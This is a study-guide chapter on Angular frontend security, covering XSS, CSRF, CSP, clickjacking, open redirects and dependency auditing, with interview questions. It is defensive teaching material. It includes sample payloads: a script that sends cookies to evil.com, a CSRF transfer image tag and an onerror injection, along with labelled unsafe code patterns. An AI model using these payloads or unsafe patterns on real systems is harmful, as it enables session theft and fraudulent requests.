# Frontend Security — XSS, CSRF, CSP, and More

> **Phase:** 4 — Security  
> **Related:** [authentication-authorization.md](./authentication-authorization.md) | [secure-api-integration.md](./secure-api-integration.md) | [browser-storage-and-sessions.md](./browser-storage-and-sessions.md)

> ⚠️ **Security examples in this file that demonstrate vulnerabilities are clearly labeled UNSAFE. Never use the unsafe examples in production.**

---

## Table of Contents

1. [Learning Objectives](#learning-objectives)
2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
3. [Angular Template Security](#angular-template-security)
4. [Content Security Policy (CSP)](#content-security-policy-csp)
5. [Trusted Types](#trusted-types)
6. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
7. [Clickjacking](#clickjacking)
8. [Open Redirects](#open-redirects)
9. [Security Headers](#security-headers)
10. [Dependency and Supply-Chain Security](#dependency-and-supply-chain-security)
11. [SSR Security Considerations](#ssr-security-considerations)
12. [Interview Questions with Answers](#interview-questions-with-answers)
13. [Exercises](#exercises)
14. [Revision Checklist](#revision-checklist)

---

## Learning Objectives

- Explain XSS, CSRF, and clickjacking with realistic attack scenarios.
- Demonstrate Angular's built-in XSS protections and how they can be bypassed.
- Configure a Content Security Policy that prevents XSS.
- Implement CSRF protection correctly.
- Understand the limits of frontend security controls.

---

## Cross-Site Scripting (XSS)

XSS is an attack where malicious scripts are injected into web pages viewed by other users.

### Types of XSS

| Type | Mechanism | Example |
|------|-----------|---------|
| **Stored XSS** | Payload stored in server DB, served to all users | Malicious content in a comment field |
| **Reflected XSS** | Payload in URL, reflected in response | `?search=<script>...` |
| **DOM-based XSS** | Payload never sent to server — JS writes it to DOM | `location.hash` used in `innerHTML` |

### Threat Scenario — Stored XSS

1. Attacker submits comment: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
2. Server stores comment without sanitization.
3. Other users load the page.
4. Browser executes the script.
5. Cookies are exfiltrated to attacker's server.

**Result:** Session hijacking, credential theft, account takeover.

### Angular's Built-in Protection

Angular's template engine **automatically escapes all interpolated values**:

```html
<!-- SAFE — Angular escapes the malicious content -->
<p>{{ userComment }}</p>
<!-- If userComment = '<script>alert(1)</script>'
     Angular renders: &lt;script&gt;alert(1)&lt;/script&gt; -->

<!-- SAFE — property binding is also escaped -->
<p [textContent]="userComment"></p>
```

### What Angular Does NOT Escape Automatically

```typescript
// UNSAFE — bypassing Angular's sanitizer
@Component({ ... })
class CommentComponent {
  private sanitizer = inject(DomSanitizer);

  // NEVER do this with user-controlled content
  trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userContent);
}

// Template: <div [innerHTML]="trustedHtml"></div>
// This is only safe when userContent comes from a fully trusted source
// (your own backend that thoroughly sanitizes it with a HTML sanitizer library)
```

```html
<!-- Angular sanitizes [innerHTML] — strips dangerous tags like <script> -->
<!-- But bypassSecurityTrustHtml() disables this sanitization -->
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(userInput)"></div>
<!-- ⛔ UNSAFE if userInput contains user-controlled content -->
```

### Safe innerHTML Usage

If you must render HTML (rich text, markdown output):

```typescript
@Component({ ... })
class RichTextComponent {
  private sanitizer = inject(DomSanitizer);

  // Angular's DomSanitizer removes <script>, event handlers, javascript: URLs
  // This is the safe way — let Angular sanitize
  get safeHtml(): SafeHtml {
    return this.sanitizer.sanitize(SecurityContext.HTML, this.richTextContent) ?? '';
  }
}

// Template: <div [innerHTML]="safeHtml"></div>
// Angular's sanitize() is safer than bypassSecurityTrustHtml()
// But for production, consider a server-side HTML sanitizer (DOMPurify, bleach)
```

### DOM-Based XSS

```typescript
// UNSAFE — writing URL fragment to innerHTML
const hash = window.location.hash.substring(1);
document.getElementById('result')!.innerHTML = decodeURIComponent(hash);
// Attacker shares: https://site.com/page#<img src=x onerror=alert(1)>

// SAFE — use textContent, not innerHTML
document.getElementById('result')!.textContent = decodeURIComponent(hash);

// SAFE — Angular template (auto-escaped)
searchResult = decodeURIComponent(window.location.hash.substring(1));
// Template: <p>{{ searchResult }}</p>
```

---

## Angular Template Security

### Template Injection Is Not a Risk in Angular

Angular compiles templates at build time (Ivy compiler). User data cannot be injected into the template compilation — Angular's template syntax is not evaluated at runtime using `eval()`. This means the kind of server-side template injection seen in frameworks like Handlebars is not applicable to Angular templates.

### URL Sanitization

Angular sanitizes `href` and `src` bindings to prevent `javascript:` URLs:

```html
<!-- Angular sanitizes this — javascript: is stripped -->
<a [href]="userProvidedUrl">Link</a>

<!-- If userProvidedUrl = 'javascript:alert(1)', Angular renders:
     href="unsafe:javascript:alert(1)" — blocked by browser -->

<!-- For trusted URLs, use DomSanitizer -->
<a [href]="sanitizer.bypassSecurityTrustUrl('javascript:void(0)')">OK button</a>
<!-- Only do this when the URL is hardcoded or fully controlled -->
```

### Style Sanitization

```html
<!-- Angular sanitizes style bindings to prevent CSS injection -->
<div [style]="userStyles"></div>
<!-- Angular will sanitize expressions like: background-image: url('javascript:...')  -->
```

---

## Content Security Policy (CSP)

CSP is an HTTP response header that restricts which resources a browser can load, providing a defense-in-depth layer against XSS.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'nonce-RANDOM'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none';
```

### Key Directives

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all resource types |
| `script-src` | JavaScript sources |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | Fetch, XHR, WebSocket connections |
| `frame-ancestors` | Who can embed this page in iframes |
| `object-src` | Plugins (Flash etc.) — set to `'none'` |
| `base-uri` | Restricts `<base>` tag |
| `upgrade-insecure-requests` | Upgrades HTTP to HTTPS |

### Angular and CSP

Angular's inline styles (created for ViewEncapsulation.Emulated) require `'unsafe-inline'` for styles, or use `nonce-based` CSP.

```typescript
// For nonce-based CSP with Angular's style encapsulation
// Angular 16+ supports nonce via APP_ID or CSP_NONCE token
import { CSP_NONCE } from '@angular/core';

providers: [
  { provide: CSP_NONCE, useValue: YOUR_NONCE_VALUE }
]
```

### CSP for Angular Applications

```
# Strict CSP for Angular SPA (no inline scripts/styles except Angular's encapsulation)
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'nonce-RANDOM123';
  img-src 'self' data: https://cdn.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
```

---

## Trusted Types

Trusted Types (a browser API) prevents DOM XSS by requiring that strings used in dangerous sinks (`innerHTML`, `eval`, `document.write`) are wrapped in trusted type objects created by a TrustedTypePolicy.

Angular 14+ can be configured to use Trusted Types:

```typescript
// main.ts — enable Trusted Types
if (typeof trustedTypes !== 'undefined') {
  // Angular will create its own policy for its internal DOM manipulation
}

// CSP header to require Trusted Types
// require-trusted-types-for 'script';
// trusted-types angular angular#bundler;
```

---

## Cross-Site Request Forgery (CSRF)

CSRF tricks a logged-in user's browser into making an unintended request to a different site.

### Threat Scenario

1. User logs in to `bank.com`. The session cookie is set with `SameSite=None` (or no SameSite attribute in older browsers).
2. User visits attacker's page at `evil.com`.
3. `evil.com` has: `<img src="https://bank.com/transfer?to=attacker&amount=1000">`.
4. Browser automatically includes the `bank.com` session cookie.
5. Bank processes the transfer thinking it came from the user.

### Defenses

**1. SameSite Cookie Attribute (preferred defense)**

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

`SameSite=Strict` — cookie is never sent in cross-site requests.
`SameSite=Lax` — sent only with top-level navigation GET requests.
`SameSite=None; Secure` — sent in all cross-site requests (old behavior).

**2. CSRF Token (double-submit cookie)**

Angular supports CSRF token handling via `HttpClientXsrfModule`:

```typescript
// Standalone setup
provideHttpClient(
  withXsrfConfiguration({
    cookieName: 'XSRF-TOKEN',     // Backend sets this cookie
    headerName: 'X-XSRF-TOKEN',  // Angular reads cookie, sends as header
  })
)

// NgModule setup
imports: [
  HttpClientXsrfModule.withOptions({
    cookieName: 'XSRF-TOKEN',
    headerName: 'X-XSRF-TOKEN',
  })
]
```

Angular reads the `XSRF-TOKEN` cookie and automatically includes it as an `X-XSRF-TOKEN` header in POST, PUT, DELETE requests. The server verifies this header matches the cookie.

**This works because:** Attacker's page can make the browser send cookies, but cannot read the value of cookies from a different origin (due to same-origin policy) — so the attacker cannot set the correct header value.

**3. Verifying Origin/Referer Headers (additional layer)**

The server can check that the `Origin` or `Referer` header matches the expected domain. Not sufficient alone — some requests may not include these headers.

---

## Clickjacking

Clickjacking embeds a victim site in a transparent iframe and tricks users into clicking on elements they cannot see.

**Defense:** The `X-Frame-Options` header and the CSP `frame-ancestors` directive.

```
X-Frame-Options: DENY        # Never allow embedding
X-Frame-Options: SAMEORIGIN  # Only same origin can embed

Content-Security-Policy: frame-ancestors 'none';    # Never allow
Content-Security-Policy: frame-ancestors 'self';    # Same origin only
```

**In Angular:** Set these headers on the server (web server config, CDN, or backend). Angular itself does not control HTTP response headers.

---

## Open Redirects

An open redirect allows an attacker to redirect users from a legitimate URL to a malicious one.

```typescript
// UNSAFE — accepting any redirect URL from query parameter
const returnUrl = this.route.snapshot.queryParams['returnUrl'];
this.router.navigateByUrl(returnUrl); // attacker sets returnUrl=https://evil.com

// SAFE — only allow relative internal redirects
const returnUrl = this.route.snapshot.queryParams['returnUrl'];
const isRelative = returnUrl?.startsWith('/') && !returnUrl.startsWith('//');
this.router.navigateByUrl(isRelative ? returnUrl : '/dashboard');

// SAFER — use Angular's Router to validate
function isSafeRedirect(url: string): boolean {
  if (!url || !url.startsWith('/')) return false;
  // Additional checks: no protocol, no // (protocol-relative URLs)
  try {
    const full = new URL(url, window.location.origin);
    return full.origin === window.location.origin;
  } catch { return false; }
}
```

---

## Security Headers

All security headers must be set by the server or CDN — not by the Angular application:

| Header | Purpose | Recommended value |
|--------|---------|-------------------|
| `Content-Security-Policy` | XSS, data injection protection | Strict policy as described above |
| `X-Frame-Options` | Clickjacking protection | `DENY` |
| `X-Content-Type-Options` | MIME sniffing prevention | `nosniff` |
| `Referrer-Policy` | Control referrer information | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Control browser features | Disable unused features |
| `Strict-Transport-Security` | Force HTTPS | `max-age=31536000; includeSubDomains` |
| `Cache-Control` | Prevent caching sensitive data | `no-store` for auth endpoints |

---

## Dependency and Supply-Chain Security

Third-party npm packages are a significant attack surface. Angular applications often have hundreds of transitive dependencies.

```bash
# Audit for known vulnerabilities
npm audit

# Fix automatically where safe
npm audit fix

# Check for outdated packages
npm outdated

# Check licenses (some licenses restrict commercial use)
npx license-checker --summary
```

**Best practices:**

- Pin exact dependency versions in `package.json` (use `--save-exact`).
- Use `package-lock.json` or `pnpm-lock.yaml` and commit it.
- Use npm audit or Snyk in CI/CD pipeline.
- Review new dependencies before installing (does the package have many dependents? Recent activity? Known publisher?).
- Enable Dependabot or Renovate for automated security updates.
- Be cautious of packages with very similar names to popular ones (typosquatting).

---

## SSR Security Considerations

When Angular Universal (SSR) is used, additional security concerns arise:

- **Server-side secrets:** Environment variables on the server must not be included in the response HTML or JavaScript bundles. Use `isPlatformBrowser` / `isPlatformServer` to guard server-only code.
- **Request context injection:** The server renders HTML for a specific user's request. Never share state between requests. Use request-scoped providers.
- **DOM-based attacks on SSR:** If user input is used during server-side rendering before sanitization, it could be injected into the HTML sent to the browser.
- **Source maps on production:** Source maps expose your source code. Host them on a private error tracking service (Sentry, Datadog) rather than serving them publicly.

---

## Interview Questions with Answers

**Q: What are the three types of XSS and how does Angular protect against each?**

> **Stored XSS:** Malicious content persists in the database and is served to users. Angular protects by auto-escaping interpolated values (`{{ }}`). **Reflected XSS:** Payload is in the URL and reflected in the response. Angular escapes template expressions, preventing DOM injection. **DOM-based XSS:** Attacker manipulates the DOM via JavaScript without the server's involvement (e.g., writing `location.hash` to `innerHTML`). Angular templates prevent this as they don't use `eval()` or `innerHTML` for expressions, but the risk exists when `bypassSecurityTrustHtml()` is misused.

**Q: CSRF tokens are server-set cookies — if the attacker makes a request from evil.com, won't the cookie be sent automatically?**

> Yes — the browser sends cookies automatically in cross-site requests. This is exactly the CSRF attack. The cookie being sent is what the attack exploits. The CSRF defense works by requiring the request to also include the token value as a **header** (not just as a cookie). The attacker's page cannot read the cookie value from `bank.com` because of the same-origin policy restricting JavaScript read access to cookies from a different origin. Therefore, the attacker cannot set the correct header — their request lacks the matching header and is rejected by the server.

**Q: Is it ever safe to use `bypassSecurityTrustHtml()`?**

> It is only safe if the content being trusted was generated by your own controlled system (your backend) after thorough server-side sanitization using a proven HTML sanitizer library (DOMPurify, bleach). It is never safe to call it with content provided directly by end users without server-side sanitization. Even then, `bypassSecurityTrustHtml` should be treated as a code smell — if it appears in a codebase, it should be documented, justified, and reviewed carefully.

---

## Exercises

1. Find and fix three XSS vulnerabilities in a provided Angular component that misuses `[innerHTML]` and `bypassSecurityTrustHtml`.
2. Write a CSP header suitable for a standalone Angular application that uses Google Fonts and connects to an API on a subdomain.
3. Implement CSRF protection using `withXsrfConfiguration()` and explain to a colleague why the server must verify the token in the header, not just the cookie.
4. Write an Angular guard that validates a `returnUrl` query parameter and rejects external URLs.

---

## Revision Checklist

- [ ] Can explain all three XSS types with realistic attack scenarios.
- [ ] Know what Angular protects automatically and what it doesn't.
- [ ] Can explain CSRF and why the CSRF token in a header defeats the attack.
- [ ] Know the key CSP directives and can write a basic policy.
- [ ] Know the `SameSite` cookie options and their security implications.
- [ ] Can identify clickjacking and know how to prevent it.
- [ ] Know how to audit npm dependencies for vulnerabilities.

---

## Further Reading

- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP: CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Angular: Security guide](https://angular.dev/best-practices/security)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Trusted Types specification](https://w3c.github.io/trusted-types/dist/spec/)
